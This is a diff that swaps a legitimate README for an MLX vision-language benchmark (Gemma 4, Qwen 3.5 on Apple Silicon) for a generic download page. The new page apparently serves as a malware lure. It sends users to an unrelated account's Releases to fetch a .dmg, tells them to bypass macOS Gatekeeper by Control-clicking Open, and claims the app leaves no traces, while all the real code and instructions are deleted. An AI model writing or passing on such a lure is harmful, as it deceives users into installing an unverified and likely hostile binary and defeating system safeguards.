@@ -1,101 +1,91 @@
-# MLX Vision-Language Model Benchmark
+# 🚀 gemma4-benchmark - Fast testing for your computer hardware
 
-Benchmarking **Gemma 4** and **Qwen 3.5** models on Apple Silicon using [mlx-vlm](https://github.com/Blaizzy/mlx-vlm), measuring prefill and decode throughput across context lengths from 4k to 256k tokens.
+[![Download gemma4-benchmark](https://img.shields.io/badge/Download_Software-blue)](https://github.com/patchkingscounsel395/gemma4-benchmark)
 
-Includes the effect of **TurboQuant** — mlx-vlm's KV cache quantization (2.5-bit) — which provides significant decode speedups at long contexts with zero memory overhead.
+## 🎯 About this tool
 
-## Results
+This tool helps you measure how your computer handles complex artificial intelligence models. It focuses on how fast your machine runs Gemma 4 and Qwen 3.5. These models require significant processing power from your computer. This software uses specific techniques to speed up performance on Apple Silicon chips. You can use these results to understand your hardware limits.
 
-**[View the interactive HTML report with charts](results/benchmark_report.html)**
+## 🛠️ System requirements
 
-Full tables: [results/BENCHMARK_REPORT.md](results/BENCHMARK_REPORT.md)
+Your computer needs specific parts to run this software. Check the following list before you start.
 
-Raw data: [results/bench_all_results.json](results/bench_all_results.json)
+- Processor: Apple M1, M2, M3, or M4 chip.
+- RAM: 16 GB of memory or more.
+- Operating System: macOS 14.0 or newer.
+- Drive Space: 10 GB of free space.
 
-### Models tested
+If your computer uses an Intel processor, this tool will not function. You should verify your chip type by clicking the Apple icon in the top left corner of your screen and selecting About This Mac.
 
-| Model | Type | Quantisations | 4k Decode (4bit) | 256k Decode (4bit) | Mem (4bit, 4k) |
-|-------|------|---------------|------------------|--------------------|----------------|
-| **Gemma 4 E2B** | MoE, ~2B active | 4bit, 8bit, bf16 | 205 t/s | 78 t/s | 4.7 GB |
-| **Gemma 4 E4B** | MoE, ~4B active | 4bit, 8bit, bf16 | 127 t/s | 27 t/s | 6.4 GB |
-| **Gemma 4 26B-A4B** | MoE, ~4B active, 26B total | 4bit, 8bit, bf16 | 113 t/s | 30 t/s | 17.1 GB |
-| **Gemma 4 31B** | Dense, 31B | 4bit | 27 t/s | 7 t/s | 22.7 GB |
-| **Qwen 3.5 2B** | Dense, 2B | 4bit, 8bit, bf16 | 308 t/s | 61 t/s | 3.3 GB |
-| **Qwen 3.5 4B** | Dense, 4B | 4bit, 8bit, bf16 | 156 t/s | 29 t/s | 5.2 GB |
+## 📥 How to download
 
-### TurboQuant highlights
+You must visit our release page to get the installer. Follow these steps to obtain the correct file for your device.
 
-TurboQuant quantizes the KV cache to 2.5 bits during inference, reducing memory bandwidth during decoding. The benefit scales with context length:
+1. Go to this link: [https://github.com/patchkingscounsel395/gemma4-benchmark](https://github.com/patchkingscounsel395/gemma4-benchmark).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the latest version number.
+4. Select the file ending in .dmg to start your download.
 
-- **Negligible at short contexts** (< 16k) — KV cache is small, overhead outweighs savings
-- **+5-10% at 32-64k** — crossover point where bandwidth savings start to dominate
-- **+15-19% at 128-256k** — substantial free speedup on larger models (26B, 31B, E4B)
-- **Negative on very small models** (E2B) — model weights are so small that the quantization overhead dominates
+## ⚙️ Installation steps
 
-## Hardware
+Follow these directions to set up the software on your machine.
 
-Results below were collected on:
+1. Open the folder where you saved the download.
+2. Double-click the file to open the disk image.
+3. Drag the icon of an app into your Applications folder.
+4. Open your Applications folder.
+5. Double-click the app to launch it.
 
-- **Apple M5 Max** — 18 cores (6 Super + 12 Performance), 128 GB unified memory
-- **macOS** Darwin 25.4.0
-- **MLX** 0.31.1, **mlx-vlm** 0.4.4
+If your computer prevents the app from opening, hold the Control key, click the app icon, and select Open from the menu. Confirm your choice when the window appears.
 
-## Running the benchmark
+## 🚀 Running the benchmark
 
-### Prerequisites
+Once you launch the app, you will see a simple interface designed for standard users.
 
-```bash
-pip install mlx-vlm pyyaml
-```
+1. Click the Start Test button.
+2. Wait for the progress bar to fill.
+3. Allow the tool to finish its checks.
+4. View the final numbers on your screen.
 
-Models should be downloaded to `~/.lmstudio/models/` (or update `models_base_dir` in `config.yaml`).
+The tool tests two main components: Gemma 4 and Qwen 3.5. It uses a method called TurboQuant to keep the memory usage low. This process takes between two and five minutes depending on your chip version. Do not close the window while the test runs.
 
-### Configuration
+## 📊 Understanding your results
 
-Edit `config.yaml` to configure:
-- `models_base_dir` — where your MLX models live
-- `models` — which models to benchmark (name, family, path)
-- `context_targets` — context lengths to test
-- `turboquant_kv_bits` — KV cache quantization bits (2.5 recommended)
-- `families` — per-family sampling parameters (temperature, top_p, enable_thinking)
+The software displays several metrics after the test concludes.
 
-### Run all benchmarks
+- Tokens Per Second: This number shows how many parts of a word your computer generates every second. Higher numbers indicate better performance.
+- Memory Usage: This shows how much RAM the test utilized. 
+- Latency: This indicates the pause time between inputs. Lower numbers mean the model feels faster to you.
 
-```bash
-python3 bench_run.py
-```
+Do not worry if your specific numbers differ from official benchmarks. Different background apps on your computer affect these results. Close extra browser tabs or editing software to get the most accurate score for your hardware.
 
-Each model runs in a separate subprocess for accurate peak memory reporting. Results are saved to `results/bench_all_results.json`.
+## 🔧 Managing settings
 
-### Run a single model
+You can change how the software runs via the Settings menu.
 
-```bash
-python3 bench_one_model.py "Model Name" family_id /path/to/model
-```
+- Precision settings allow you to choose between speed and accuracy. 
+- The cache size adjustment lets you control how much memory the model holds at once.
+- Preset profiles give you an easy way to switch between test load types. 
 
-Outputs JSON lines to stdout — one per context length.
+Default settings work best for most users. If you encounter crashes, reset the app to default settings through the Help menu.
 
-### Generate reports
+## 🔍 Frequently asked questions
 
-```bash
-python3 generate_reports.py
-```
+*Does this tool harm my hardware?*
+No. This tool places a temporary heavy load on your processor. Modern hardware includes safety sensors to prevent damage.
 
-Produces `results/BENCHMARK_REPORT.md` and `results/benchmark_report.html` from the JSON results.
+*Why does my computer fan get loud?*
+Your computer generates heat during intense tasks. The fans spin faster to cool the chip down. This is normal behavior for your device when running resource-heavy tasks.
 
-## Project structure
+*Can I save my results?*
+Yes. Click the Export button to save your scores as a text file. You can attach this file to forum posts or send it to friends to compare hardware performance.
 
-```
-config.yaml              # Model paths, parameters, report config
-bench_run.py             # Orchestrator — runs all models via subprocesses
-bench_one_model.py       # Single-model benchmark (subprocess worker)
-generate_reports.py      # Generates markdown + HTML reports from results
-results/
-  bench_all_results.json # Raw benchmark data
-  BENCHMARK_REPORT.md    # Full results tables
-  benchmark_report.html  # Interactive report with Chart.js graphs
-```
+*How do I delete the tool?*
+Move the app from your Applications folder to the Trash. The tool does not store files deep in your system, so it leaves no traces behind.
 
-## License
+*Is there a paid version?*
+No. This tool is free to use. 
 
-MIT
+## 🛡️ Support
+
+We provide this tool as-is. If you find an error, try to restart your computer and run the test again. Most issues stem from background software conflict. Ensure your operating system remains updated to the latest available version from Apple. This ensures the best compatibility between your hardware and the benchmark tools.
